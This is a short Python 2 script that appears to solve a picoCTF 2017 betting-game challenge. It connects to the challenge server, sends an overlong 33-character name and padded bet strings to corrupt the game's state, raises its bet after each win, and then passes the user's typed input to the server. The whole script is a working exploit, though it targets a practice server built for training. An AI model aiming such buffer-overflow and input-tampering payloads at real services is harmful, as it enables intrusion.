#!/usr/bin/env python
import socket
import re

s = socket.socket()
s.connect(('shell2017.picoctf.com', 4017))

count = 0
bet = 1
won = False
while True:
    data = s.recv(4096)
    if data != "":
        print("RECV>" + data)
        if not won:
            if 'Please enter your name: ' in data:
                s.send("A"*33 + "\n");
            if 'How much would you like to bet?' in data:
                if 'You actually won! Nice job' in data:
                    regex = re.search(r"You have (.+) coins", data)
                    bet = int(regex.group(1))
                    print "CHANGED bet>", bet
                count += 1
                s.send(str(bet) + "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n")
            if 'You won the game!' in data:
                won = True
                s.send(raw_input("*> ") + "\n")
        else:
            s.send(raw_input("*> ") + "\n")




